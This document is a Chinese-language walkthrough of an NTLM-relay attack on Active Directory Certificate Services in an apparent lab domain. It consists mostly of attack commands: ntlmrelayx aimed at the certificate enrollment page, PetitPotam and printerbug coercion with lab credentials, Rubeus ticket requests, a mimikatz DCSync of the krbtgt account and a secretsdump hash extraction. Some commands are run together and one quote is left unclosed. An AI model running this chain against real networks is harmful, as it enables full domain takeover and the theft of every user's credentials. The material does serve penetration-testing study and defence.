内网渗透ADCS证书服务攻击

作者：谢公子   

由于ADCS的http证书接⼝没有启⽤NTLM中继保护，因此其易受NTLM Relay攻击。⽽且Authorization HTTP 标头明确只允许通过 NTLM 身份验证，因此Kerberos协议⽆法使⽤。因此，攻击者可以利⽤NTLM Relay攻击ADCS证书服务。

http://10.211.55.4/certsrv/certfnsh.asp

漏洞复现

定位证书服务器机器

certutil -config - -ping

ntlmrelayx监听，这⾥需要新的impacket：

https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs

attack

python3 ntlmrelayx.py -t http://10.211.55.4/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller

使⽤脚本触发辅助域控回连我们的攻击机器，这⾥可以使⽤最新的Petitpotam.py，也可以使⽤printerbug.py

python3 Petitpotam.py -d xie.com -u hack -p P@ss1234 10.211.55.2 10.211.55.5#或者使⽤printerbug.py也可以触发python3 printerbug.py xie/hack@10.211.55.5 10.211.55.2

或

然后使⽤Rubeus导⼊证书数据

Rubeus.exe asktgt /user:AD02$ /certificate:打印出来的


然后使⽤mimikatz即可导出域内任意⽤户哈希

mimikatz.exe#查看kerberos票据kerberos::list#导出krbtgt⽤户的hashlsadump::dcsync /user:krbtgt /csv

或者可以⼿动导⼊证书

kerberos::ptt ticket.kirbi

也可以使⽤kekeo将.kirbi后缀的证书转换为 .ccache后缀的证书，然后使⽤impacket⼯具进⾏利⽤。

misc::convert ccache ticket.kirbi

export KRB5CCNAME=AD02\$\@XIE.COM_krbtgt~xie.com\@XIE.COM.ccachesproxychains4 -q python3 secretsdump.py -k -no-pass AD01.xie.com -just-dc-useradministrator
